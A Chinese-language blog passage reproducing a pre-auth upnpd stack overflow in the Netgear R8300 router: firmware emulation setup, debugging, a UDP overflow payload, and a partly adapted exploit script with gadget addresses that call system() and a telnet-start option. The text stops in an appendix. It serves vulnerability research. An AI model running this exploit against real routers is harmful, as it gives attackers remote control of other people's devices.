寄存器名</th></tr></thead><tbody><tr><td align="center">R0</td><td align="center">通用寄存器</td><td align="center">EAX</td></tr><tr><td align="center">R1~R5</td><td align="center">通用寄存器</td><td align="center">EBX、ECX、EDX、EDI、ESI</td></tr><tr><td align="center">R6~R10</td><td align="center">通用寄存器</td><td align="center">无</td></tr><tr><td align="center">R11(FP)</td><td align="center">栈帧指针</td><td align="center">EBP</td></tr><tr><td align="center">R12(IP)</td><td align="center">内部程序调用</td><td align="center">无</td></tr><tr><td align="center">R13(SP)</td><td align="center">堆栈指针</td><td align="center">ESP</td></tr><tr><td align="center">R14(LP)</td><td align="center">链接寄存器</td><td align="center">无</td></tr><tr><td align="center">R15(PC)</td><td align="center">程序计数器</td><td align="center">EIP</td></tr><tr><td align="center">CPSR</td><td align="center">程序状态寄存器</td><td align="center">EFLAGS</td></tr></tbody></table><h2 id="32位"><a href="#32位" class="headerlink" title="32位"></a>32位</h2><ol><li><p>参数传递</p><p>前4个参数通过R0 ~ R3传递，第4个参数需要通过sp访问，第5个参数需要sp+4访问，第n个参数需要通过sp + 4*(n-4)访问；当参数个数多于4个时，将多余的参数通过数据栈进行传递，入栈顺序与参数顺序正好相反，子程序返回前无需恢复R0~R3的值</p></li><li><p>在子程序中，使用R4~R11保存局部变量，若使用需要入栈保存，子程序返回前需要恢复这些寄存器；R12是临时寄存器，使用不需要保存</p></li><li><p>子程序返回32位的整数，使用R0返回；返回64位整数时，使用R0返回低位，R1返回高位</p></li></ol><h2 id="64位"><a href="#64位" class="headerlink" title="(64位)"></a>(64位)</h2><ol><li><p>参数传递</p><p>前8个参数是通过x0~x7传递，第8个参数需要通过sp访问，第9个参数需要通过sp + 8 访问，第n个参数需要通过sp + 8*(n-8)访问。</p></li></ol><h2 id="叶函数-非页函数"><a href="#叶函数-非页函数" class="headerlink" title="叶函数 非页函数"></a>叶函数 非页函数</h2><p>叶函数是指本身不会调用其他函数。非叶函数是指除了它自己的逻辑外，还会调用到其他的函数。</p><h1 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h1><p><img src="https://raw.githubusercontent.com/p1Kk/blogImg/master/Picture/sub_1D020.png" alt="sub_1D020"><br><img src="https://raw.githubusercontent.com/p1Kk/blogImg/master/Picture/sub_25E04.png" alt="sub_25E04"></p><p>0x634-0x58=0x5dc即可溢出v40，0x634-0x34覆盖到v51指针</p><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>固件下载地址：<a href="https://www.netgear.com/support/product/R8300.aspx#Firmware%20Version%201.0.2.130" target="_blank" rel="noopener">https://www.netgear.com/support/product/R8300.aspx#Firmware%20Version%201.0.2.130</a></p><ul><li><p>qemu-arm：<a href="https://people.debian.org/~aurel32/qemu/armhf/" target="_blank" rel="noopener">https://people.debian.org/~aurel32/qemu/armhf/</a></p><p>（系统态）<a href="https://www.jianshu.com/p/cd7d9a753433" target="_blank" rel="noopener">https://www.jianshu.com/p/cd7d9a753433</a></p></li><li><p>安装arm-linux-gcc</p></li><li><p>安装 <a href="https://github.com/firmadyne/firmadyne" target="_blank" rel="noopener">https://github.com/firmadyne/firmadyne</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ cd ./firmadyne/sources/libnvram</span><br><span class="line">$ make clean &amp;&amp; CC=/opt/cross/arm-linux-musleabi/bin/arm-linux-musleabi-gcc make &amp;&amp; mv libnvram.so ../../binaries/libnvram.so.armel</span><br><span class="line">$ cp libnvram.so 【固件目录】/firmadyne/libnvram.so.armel</span><br><span class="line">在固件目录下</span><br><span class="line">$ mkdir -p /firmadyne/libnvram/</span><br><span class="line">$ mkdir -p /firmadyne/libnvram.override/</span><br></pre></td></tr></table></figure></li><li><p><del>busybox</del></p></li></ul><h2 id="user-mod"><a href="#user-mod" class="headerlink" title="user mod"></a>user mod</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ cp $(which qemu-arm-static) .</span><br><span class="line">$ sudo chroot . ./qemu-arm-static --strace ./usr/sbin/upnpd</span><br></pre></td></tr></table></figure><p>看到日志     <code>31181 open(&quot;/var/run/upnpd.pid&quot;,O_RDWR|O_CREAT|O_TRUNC,0666) = -1 errno=2 (No such file or directory)</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ ll ./</span><br><span class="line">total 5972</span><br><span class="line">......</span><br><span class="line">lrwxrwxrwx  1 kk kk       7 Dec 12  2018 var -&gt; tmp/var/</span><br><span class="line">drwxr-xr-x  8 kk kk   28672 Dec 12  2018 www/</span><br></pre></td></tr></table></figure><p>所以我们需要创建<code>./tmp/var/run</code>目录，或通过<a href="https://www.cnblogs.com/from-zero/p/12957978.html" target="_blank" rel="noopener">使用-L参数</a>解决</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ mkdir -p ./tmp/var/run</span><br></pre></td></tr></table></figure><p>再次运行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo chroot . ./qemu-arm-static ./usr/sbin/upnpd</span><br></pre></td></tr></table></figure><p>大量报错</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">/dev/nvram: No such file or directory</span><br><span class="line">/dev/nvram: No such file or directory</span><br><span class="line">/dev/nvram: No such file or directory</span><br><span class="line">/dev/nvram: No such file or directory</span><br><span class="line">/dev/nvram: No such file or directory</span><br><span class="line">/dev/nvram: No such file or directory</span><br><span class="line">/dev/nvram: No such file or directory</span><br><span class="line">open: No such file or directory</span><br><span class="line">/dev/nvram: No such file or directory</span><br><span class="line">/dev/nvram: No such file or directory</span><br><span class="line">/dev/nvram: No such file or directory</span><br></pre></td></tr></table></figure><p>关于<code>LD_PRELOAD</code>—<a href="https://payloads.online/archivers/2020-01-01/1#" target="_blank" rel="noopener">https://payloads.online/archivers/2020-01-01/1#</a></p><h3 id="修复NVRAM错误"><a href="#修复NVRAM错误" class="headerlink" title="修复NVRAM错误"></a>修复NVRAM错误</h3><ul><li>法一</li></ul><p><a href="https://raw.githubusercontent.com/therealsaumil/custom_nvram/master/custom_nvram_r6250.c" target="_blank" rel="noopener">https://raw.githubusercontent.com/therealsaumil/custom_nvram/master/custom_nvram_r6250.c</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ arm-linux-gcc -Wall -fPIC -shared nvram.c -o nvram.so</span><br><span class="line">$ sudo chroot ./ ./qemu-arm-static -E LD_PRELOAD=nvram.so ./usr/sbin/upnpd</span><br></pre></td></tr></table></figure><p>报错：</p><p><img src="https://raw.githubusercontent.com/p1Kk/blogImg/master/Picture/8300libcso6.png" alt></p><p>解决方法：在lib目录下有libc.so.0，创建一个软链接</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ln -s libc.so.0 libc.so.6</span><br></pre></td></tr></table></figure><p>再次运行提示</p><p><img src="https://raw.githubusercontent.com/p1Kk/blogImg/master/Picture/errordlsym.png" alt></p><p>查找<code>dlsym</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ sudo grep -r &quot;dlsym&quot; .</span><br><span class="line">$ readelf -a ./lib/libdl.so.0 | grep dlsym</span><br><span class="line">    26: 000010f0   296 FUNC    GLOBAL DEFAULT    7 dlsym</span><br></pre></td></tr></table></figure><p>再次运行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo chroot ./ ./qemu-arm-static -E LD_PRELOAD=&quot;nvram.so ./lib/libdl.so.0&quot; ./usr/sbin/upnpd</span><br></pre></td></tr></table></figure><p>根据报错创建文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ touch ./tmp/nvram.ini</span><br></pre></td></tr></table></figure><p>然后继续修改nvram配置 在<code>./tmp/nvram.ini</code>中添加配置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">upnpd_debug_level=9</span><br><span class="line">lan_ipaddr=192.168.65.1</span><br><span class="line">hwrev=MP1T99</span><br><span class="line">hwver=R8500</span><br><span class="line">friendly_name=R8300</span><br><span class="line">upnp_enable=1</span><br><span class="line">upnp_turn_on=1</span><br><span class="line">upnp_advert_period=30</span><br><span class="line">upnp_advert_ttl=4</span><br><span class="line">upnp_portmap_entry=1</span><br><span class="line">upnp_duration=3600</span><br><span class="line">upnp_DHCPServerConfigurable=1</span><br><span class="line">wps_is_upnp=0</span><br><span class="line">upnp_sa_uuid=00000000000000000000</span><br><span class="line">lan_hwaddr=AA:BB:CC:DD:EE:FF</span><br></pre></td></tr></table></figure><ul><li>法二</li></ul><blockquote><p><a href="https://github.com/zcutlip/nvram-faker" target="_blank" rel="noopener">https://github.com/zcutlip/nvram-faker</a></p><p><a href="https://github.com/firmadyne/libnvram⭐" target="_blank" rel="noopener">https://github.com/firmadyne/libnvram⭐</a></p></blockquote><p>编译运行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">// 我将libnvram的makefile文件中的CC设置为 arm-linux-gcc</span><br><span class="line">$ ./Makefile </span><br><span class="line">$ make</span><br><span class="line">$ cp libnvram.so ~/iot/_R8300-V1.0.2.130_1.0.99.chk.extracted/squashfs-root/firmadyne/libnvram.so</span><br><span class="line">// 在squashfs-root目录下</span><br><span class="line">$ mkdir -p /firmadyne/libnvram/ </span><br><span class="line">$ mkdir -p /firmadyne/libnvram.override/</span><br></pre></td></tr></table></figure><p>再次运行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo chroot . ./qemu-arm-static -E LD_PRELOAD=./firmadyne/libnvram.so ./usr/sbin/upnpd</span><br></pre></td></tr></table></figure><p>根据缺少的配置 进行补全，见附录<code>1_config.h</code></p><p>输出的信息会发现，IP总被劫持为0000，将<code>/usr/lib/libnvram.so</code> 替换成我们编译的libnvram.so即可…也不需要ld_preload附加调试了。</p><blockquote><p><a href="http://mrbelieve.tech/2020/10/19/Netgear%20Nighthawk%20R8300%20upnpd%20PreAuth%20RCE%20%E5%A4%8D%E7%8E%B0%E8%BE%85%E5%8A%A9/#qemu-user-mode%E6%A8%A1%E6%8B%9F_" target="_blank" rel="noopener">Netgear Nighthawk R8300 upnpd PreAuth RCE 复现辅助</a></p><p><a href="https://www.anquanke.com/post/id/215428" target="_blank" rel="noopener">https://www.anquanke.com/post/id/215428</a></p></blockquote><h1 id="sys-mod"><a href="#sys-mod" class="headerlink" title="sys mod"></a>sys mod</h1><p>同上法一 运行成功</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># LD_PRELOAD=&apos;./nvram.so /lib/libdl.so.0&apos; /usr/sbin/upnpd</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/p1Kk/blogImg/master/Picture/runsuccess.png" alt></p><p>开始远程调试</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># ./gdbserver --attach 192.168.65.2:1234 $(ps|grep upnpd|grep -v grep|awk &apos;&#123;print $1&#125;&apos;)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ gdb-multiarch</span><br><span class="line">pwndbg&gt; set architecture arm</span><br><span class="line">The target architecture is assumed to be arm</span><br><span class="line">pwndbg&gt; target remote 192.168.65.2:1234</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## exp.py</span></span><br><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">p32 = <span class="keyword">lambda</span> x: struct.pack(<span class="string">"&lt;L"</span>, x)</span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br><span class="line">payload = (</span><br><span class="line">    <span class="number">0x604</span> * <span class="string">b'a'</span> + <span class="comment"># 0x7eb1d5ec</span></span><br><span class="line">p32(<span class="number">0x7eb1d5ec</span>) +  <span class="comment"># v51</span></span><br><span class="line">    (<span class="number">0x634</span> - <span class="number">0x604</span> - <span class="number">8</span>) * <span class="string">b'a'</span> +</span><br><span class="line">    p32(<span class="number">0x43434343</span>)  <span class="comment"># PC</span></span><br><span class="line">)</span><br><span class="line">s.connect((<span class="string">'192.168.65.2'</span>, <span class="number">1900</span>))</span><br><span class="line">s.send(payload)</span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure><p>第一次直接运行python exp.py发现</p><p><img src="https://raw.githubusercontent.com/p1Kk/blogImg/master/Picture/failgdb.png" alt></p><p>再次调试运行，运行出现upnp_turn_on=1后再执行脚本出现错误</p><p><img src="https://raw.githubusercontent.com/p1Kk/blogImg/master/Picture/successgdb.png" alt></p><h2 id="探测目标版本"><a href="#探测目标版本" class="headerlink" title="探测目标版本"></a>探测目标版本</h2><p><a href="https://github.com/grimm-co/NotQuite0DayFriday" target="_blank" rel="noopener">https://github.com/grimm-co/NotQuite0DayFriday</a>  </p><h1 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br></pre></td><td class="code"><pre><span class="line">import SimpleHTTPServer</span><br><span class="line">import SocketServer</span><br><span class="line">import argparse</span><br><span class="line">import collections</span><br><span class="line">import os</span><br><span class="line">import shutil</span><br><span class="line">import socket</span><br><span class="line">import struct</span><br><span class="line">import sys</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">address_info = &#123;</span><br><span class="line">&quot;R8300&quot; : &#123;</span><br><span class="line"># 0) gadget: calls system($sp)</span><br><span class="line">&quot;1.0.2.130&quot; : 0x35B18,</span><br><span class="line">&quot;1.0.2.128&quot; : 0x35B18,</span><br><span class="line">&quot;1.0.2.122&quot; : 0x355fc,</span><br><span class="line">&quot;1.0.2.116&quot; : 0x35258,</span><br><span class="line">&quot;1.0.2.106&quot; : 0x34f40,</span><br><span class="line">&quot;1.0.2.100&quot; : 0x34d38,</span><br><span class="line">&quot;1.0.2.94&quot;  : 0x34d8c,</span><br><span class="line">&quot;1.0.2.86&quot;  : 0x348b8,</span><br><span class="line">&quot;1.0.2.80&quot;  : 0x348b8,</span><br><span class="line">&quot;1.0.2.48&quot;  : 0x340b8,</span><br><span class="line">&#125;,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">firmware_version_to_human_version = &#123;</span><br><span class="line">&quot;R8300&quot; : &#123;</span><br><span class="line"># These version strings may be slightly off. Versions 1.0.2.128 and 1.0.2.130 only used</span><br><span class="line"># the short versions, rather than the full version string like other models.</span><br><span class="line">&quot;V1.0.2.130&quot;        : &quot;1.0.2.130&quot;,</span><br><span class="line">&quot;V1.0.2.128&quot;        : &quot;1.0.2.128&quot;,</span><br><span class="line">&quot;V1.0.2.122_1.0.94&quot; : &quot;1.0.2.122&quot;,</span><br><span class="line">&quot;V1.0.2.116_1.0.90&quot; : &quot;1.0.2.116&quot;,</span><br><span class="line">&quot;V1.0.2.106_1.0.85&quot; : &quot;1.0.2.106&quot;,</span><br><span class="line">&quot;V1.0.2.100_1.0.82&quot; : &quot;1.0.2.100&quot;,</span><br><span class="line">&quot;V1.0.2.94_1.0.79&quot;  : &quot;1.0.2.94&quot;,</span><br><span class="line">&quot;V1.0.2.86_1.0.75&quot;  : &quot;1.0.2.86&quot;,</span><br><span class="line">&quot;V1.0.2.80_1.0.71&quot;  : &quot;1.0.2.80&quot;,</span><br><span class="line">&quot;V1.0.2.48_1.0.52&quot;  : &quot;1.0.2.48&quot;,</span><br><span class="line">&#125;,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ftp_devices = &#123;&quot;WNR3500&quot; : &quot;arm_lsb&quot;, &quot;WNCE3001&quot; : &quot;mips_msb&quot;&#125;</span><br><span class="line"></span><br><span class="line">def send(ip, port, is_https, payload, keep_open = False):</span><br><span class="line">if is_https:</span><br><span class="line">return send_ssl(ip, port, payload, keep_open)</span><br><span class="line">else:</span><br><span class="line">return send_plain(ip, port, payload, keep_open)</span><br><span class="line"></span><br><span class="line">def send_plain(ip, port, payload, keep_open):</span><br><span class="line">sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">sock.connect((ip, port))</span><br><span class="line">sock.send(payload)</span><br><span class="line">if keep_open:</span><br><span class="line">return sock</span><br><span class="line">sock.close()</span><br><span class="line"></span><br><span class="line">def send_ssl(ip, port, payload, keep_open):</span><br><span class="line">import ssl</span><br><span class="line">sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">wrappedSocket = ssl.wrap_socket(sock)</span><br><span class="line">wrappedSocket.connect((ip, port))</span><br><span class="line">wrappedSocket.send(payload)</span><br><span class="line">if keep_open:</span><br><span class="line">return wrappedSocket</span><br><span class="line">wrappedSocket.close()</span><br><span class="line"></span><br><span class="line">def find_item(contents, start_string):</span><br><span class="line">start = contents.find(start_string)</span><br><span class="line">if(start == -1):</span><br><span class="line">print(&quot;Failed to automatically detect version.&quot;)</span><br><span class="line">sys.exit(1)</span><br><span class="line"></span><br><span class="line">start += len(start_string)</span><br><span class="line">end = contents.find(&quot;\r\n&quot;, start)</span><br><span class="line">return contents[start:end].upper() # upper just in case</span><br><span class="line"></span><br><span class="line">def detect_model_version(ip, port, is_https):</span><br><span class="line">request = &quot;GET /currentsetting.htm HTTP/1.1\r\nHost: &#123;&#125;\r\n\r\n&quot;.format(ip)</span><br><span class="line">sock = send(ip, port, is_https, request, True)</span><br><span class="line"></span><br><span class="line">contents = &quot;&quot;</span><br><span class="line">while contents.find(&quot;InternetConnectionStatus&quot;) == -1 and contents.find(&quot;401 Unauthorized&quot;) == -1:</span><br><span class="line">contents += sock.recv(1)</span><br><span class="line"></span><br><span class="line"># Some older models/versions don&apos;t have the currentsetting.htm page, or it&apos;s protected by login</span><br><span class="line">if contents.find(&quot;401 Unauthorized&quot;) != -1:</span><br><span class="line">print(&quot;Version detection against this router is not possible using currentsetting.htm.&quot;)</span><br><span class="line">print(&quot;Received response:\n&#123;&#125;\n&quot;.format(contents))</span><br><span class="line">sys.exit(1)</span><br><span class="line"></span><br><span class="line">model = find_item(contents, &quot;Model=&quot;)</span><br><span class="line">firmware_version = find_item(contents, &quot;Firmware=&quot;)</span><br><span class="line"></span><br><span class="line">if (model not in firmware_version_to_human_version.keys() or</span><br><span class="line">firmware_version not in firmware_version_to_human_version[model]):</span><br><span class="line">print(&quot;Unknown model and version: &#123;&#125; &#123;&#125;&quot;.format(model, firmware_version))</span><br><span class="line">sys.exit(1)</span><br><span class="line"></span><br><span class="line">return model, firmware_version_to_human_version[model][firmware_version]</span><br><span class="line"></span><br><span class="line">def main(args):</span><br><span class="line"># find version</span><br><span class="line">if args.version == &quot;&quot; or args.model == &quot;&quot;:</span><br><span class="line">if args.csrf:</span><br><span class="line">print(&quot;The model and version cannot be automatically determined in CSRF mode.&quot;)</span><br><span class="line">sys.exit(1)</span><br><span class="line">args.model, args.version = detect_model_version(args.ip, args.port, args.https)</span><br><span class="line">print(&quot;Automatically detected model &#123;&#125; and version &#123;&#125;&quot;.format(args.model, args.version))</span><br><span class="line"></span><br><span class="line"># prove</span><br><span class="line">p32 = lambda x: struct.pack(&quot;&lt;L&quot;, x)</span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br><span class="line">payload = (</span><br><span class="line">0x604 * b&apos;a&apos; + # 0x7eb1d5ec</span><br><span class="line">p32(0x7eb1d5ec) +  # v51</span><br><span class="line">(0x634 - 0x604 - 8) * b&apos;a&apos; +</span><br><span class="line">p32(0x43434343)  # PC</span><br><span class="line">)</span><br><span class="line">s.connect((&apos;192.168.65.2&apos;, 1900))</span><br><span class="line">s.send(payload)</span><br><span class="line">s.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">parser = argparse.ArgumentParser(description=&apos;Run the exploit&apos;)</span><br><span class="line">parser.add_argument(&apos;ip&apos;, type=str, default=None, help=&apos;The IP address of the webserver to exploit&apos;)</span><br><span class="line">parser.add_argument(&apos;-command&apos;, type=str, default=&quot;START_TELNET&quot;, help=&apos;The command to run; default is to start telnet on port 8888 (or 3333 if 8888 is already used)&apos;)</span><br><span class="line">parser.add_argument(&apos;-csrf&apos;, required=False, action=&apos;store_true&apos;, help=&apos;Run a web server that sends the exploit as a CSRF payload&apos;)</span><br><span class="line">parser.add_argument(&apos;-https&apos;, required=False, action=&apos;store_true&apos;, help=&apos;Run the exploit against a webserver running HTTPS&apos;)</span><br><span class="line">parser.add_argument(&apos;-file&apos;, required=False, action=&apos;store_true&apos;, help=&apos;Write the exploit firmware to a file (which typically&apos;</span><br><span class="line">+ &apos; has a file extension .chk). Use the ip argument to specify the filename.&apos;)</span><br><span class="line">parser.add_argument(&apos;-port&apos;, type=int, default=80, help=&apos;The port of the webserver to exploit&apos;)</span><br><span class="line">parser.add_argument(&apos;-model&apos;, type=str, default=&quot;&quot;, help=&apos;The model of the webserver to exploit (default autodetect).&apos;</span><br><span class="line">+ &apos; Supported models are: &#123;&#125;&apos;.format(&quot;, &quot;.join(address_info.keys())))</span><br><span class="line">parser.add_argument(&apos;-version&apos;, type=str, default=&quot;&quot;, help=&apos;The version of the webserver to exploit (default autodetect).&apos;</span><br><span class="line">+ &apos; Supported versions are: &#123;&#125;&apos;.format(&quot;; &quot;.join([&quot;&#123;&#125;: &#123;&#125;&quot;.format(x, &quot;, &quot;.join(address_info[x])) for x in address_info.keys()])))</span><br><span class="line">parser.add_argument(&apos;-local_ip&apos;, type=str, default=&quot;&quot;, help=&apos;The IP address the exploited host should connect back to download a&apos;</span><br><span class="line">+ &apos; payload, only used on the devices: &#123;&#125; (default autodetect).&apos;.format(&quot;, &quot;.join(ftp_devices.keys())))</span><br><span class="line">parser.add_argument(&apos;-version-only&apos;, required=False, action=&apos;store_true&apos;, help=&quot;Only detect the model/version of a device, don&apos;t exploit&quot;)</span><br><span class="line">args = parser.parse_args()</span><br><span class="line">args.model = args.model.upper()</span><br><span class="line"></span><br><span class="line">main(args)</span><br></pre></td></tr></table></figure><p>脚本还有点儿问题</p><h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><h2 id="获取ARM架构的libc-so-6文件方法"><a href="#获取ARM架构的libc-so-6文件方法" class="headerlink" title="获取ARM架构的libc.so.6文件方法"></a><a href="https://www.cnblogs.com/from-zero/p/12606867.html" target="_blank" rel="noopener">获取ARM架构的libc.so.6文件方法</a></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ apt-cache search libc6 | grep armel</span><br><span class="line">$ sudo apt-get install libc6-armel-cross【举例】</span><br><span class="line">共享库目录</span><br><span class="line">/usr/arm-linux-gnueabi</span><br></pre></td></tr></table></figure><h1 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span 